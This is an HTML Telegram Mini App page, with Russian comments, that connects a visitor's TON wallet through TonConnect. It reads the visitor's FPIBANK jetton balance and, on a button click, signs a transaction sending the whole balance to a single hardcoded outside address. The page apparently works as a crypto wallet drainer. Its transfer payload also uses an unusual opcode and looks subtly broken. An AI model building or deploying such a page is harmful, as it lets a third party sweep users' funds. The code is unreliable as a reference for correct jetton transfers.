<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' 'unsafe-eval' 'unsafe-inline' https://telegram.org https://unpkg.com https://tonapi.io;
    style-src 'self' 'unsafe-inline' https://unpkg.com;
    connect-src 'self' https://bridge.tonapi.io https://tonconnect.manifestapi.io https://tonapi.io;
    font-src 'self' https://unpkg.com;
    img-src * data:;
  ">
  <title>Telegram Mini App: Отправка всех токенов FPIBANK</title>
  
  <!-- Telegram WebApp -->
  <script src="https://telegram.org/js/telegram-webapp.js"></script>
  <!-- TonConnect UI -->
  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
  <!-- UMD-сборка ton-core (через unpkg) -->
  <script src="https://unpkg.com/ton-core@latest/dist/ton-core.umd.js"></script>
</head>
<body>
  <h1>Отправка всех FPIBANK (Jetton)</h1>
  
  <!-- Контейнер для кнопки подключения кошелька TonConnect -->
  <div id="ton-connect"></div>
  <!-- Кнопка отправки -->
  <button id="sendAllJettonBtn">Отправить все FPIBANK</button>

  <script>
    // Если не запускаемся в Telegram Mini App – создаём заглушку для Telegram.WebApp
    if (typeof Telegram === "undefined") {
      window.Telegram = {
        WebApp: {
          ready: () => console.log("Telegram WebApp ready stub"),
          showAlert: (msg) => alert(msg)
        }
      };
    } else {
      Telegram.WebApp.ready();
    }

    // Инициализация TonConnect UI
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
      buttonRootId: "ton-connect"
    });

    // Из глобальной переменной tonCore (UMD-бандл)
    const { beginCell, cellToBoc, Address } = tonCore;

    // Адрес Jetton Master (контракт FPIBANK)
    const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
    // Адрес, куда переводим токены (назначение)
    const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";

    /**
     * Получает Jetton Wallet пользователя и его баланс через tonapi.io.
     * @param {string} userTonAddress - TON-адрес пользователя.
     * @returns {Promise<{walletAddress: string, balance: string}>}
     */
    async function getUserJettonWalletAndBalance(userTonAddress) {
      try {
        const url = `https://tonapi.io/v2/jetton/wallets?account=${userTonAddress}&jetton_master=${jettonMasterAddress}`;
        const res = await fetch(url);
        const data = await res.json();
        if (!data.wallets || data.wallets.length === 0) {
          return { walletAddress: null, balance: "0" };
        }
        const walletInfo = data.wallets[0];
        return { walletAddress: walletInfo.address, balance: walletInfo.balance };
      } catch (err) {
        console.error("Ошибка получения Jetton Wallet:", err);
        return { walletAddress: null, balance: "0" };
      }
    }

    /**
     * Собирает BOC для метода internal_transfer согласно стандарту Jetton.
     * @param {string} amountNano - Сумма токенов (в наносах) для перевода.
     * @param {string} toAddr - Адрес получателя (destination).
     * @param {string} fromAddr - TON-адрес отправителя (response_destination).
     * @returns {string} Base64-представление BOC.
     */
    function buildInternalTransferBOC(amountNano, toAddr, fromAddr) {
      const OP_INTERNAL_TRANSFER = 0x178d4519; // Опкод internal_transfer
      const cell = beginCell()
        .storeUint(OP_INTERNAL_TRANSFER, 32)  // op
        .storeUint(0, 64)                     // query_id = 0
        .storeCoins(amountNano)               // Сумма токенов (в наносах)
        .storeAddress(Address.parse(toAddr))  // destination
        .storeAddress(Address.parse(fromAddr))// response_destination
        .storeBit(false)                      // custom_payload отсутствует
        .storeCoins(0)                        // forward_ton_amount = 0
        .storeBit(false)                      // forward_payload отсутствует
        .endCell();
      return cellToBoc(cell, { idx: false }).toString("base64");
    }

    /**
     * Отправляет транзакцию через TonConnect UI.
     * @param {string} userJettonWallet - Адрес Jetton Wallet пользователя.
     * @param {string} bocBase64 - Сериализованный payload (BOC) в Base64.
     */
    async function sendAllJettonTransaction(userJettonWallet, bocBase64) {
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 360,
        messages: [
          {
            address: userJettonWallet,       // Обращаемся к Jetton Wallet (а не к Master!)
            amount: "20000000",              // 0.02 TON для оплаты газа
            payload: bocBase64
          }
        ]
      };

      try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log("Результат перевода Jetton:", result);
        Telegram.WebApp.showAlert("Результат перевода Jetton: " + JSON.stringify(result));
      } catch (error) {
        console.error("Ошибка при отправке Jetton:", error);
        Telegram.WebApp.showAlert("Ошибка при отправке Jetton: " + error.message);
      }
    }

    /**
     * Основная функция отправки всех токенов FPIBANK.
     */
    async function sendAllFPIBANK() {
      if (!tonConnectUI.connected) {
        Telegram.WebApp.showAlert("Сначала подключите кошелек через TonConnect.");
        return;
      }

      // Получаем TON-адрес пользователя (не Jetton Wallet)
      const userTonAddress = tonConnectUI.session.account.address;
      console.log("TON-адрес пользователя:", userTonAddress);

      // Получаем Jetton Wallet и баланс пользователя
      const { walletAddress, balance } = await getUserJettonWalletAndBalance(userTonAddress);
      if (!walletAddress) {
        Telegram.WebApp.showAlert("У пользователя нет Jetton Wallet для FPIBANK или произошла ошибка в API.");
        return;
      }
      console.log("Jetton Wallet:", walletAddress, "Баланс:", balance);

      if (balance === "0") {
        Telegram.WebApp.showAlert("У пользователя 0 FPIBANK токенов.");
        return;
      }

      // Собираем payload для internal_transfer, передавая весь баланс
      const bocBase64 = buildInternalTransferBOC(balance, recipientAddress, userTonAddress);
      // Отправляем транзакцию на Jetton Wallet
      await sendAllJettonTransaction(walletAddress, bocBase64);
    }

    document.getElementById("sendAllJettonBtn").addEventListener("click", sendAllFPIBANK);
  </script>
</body>
</html>
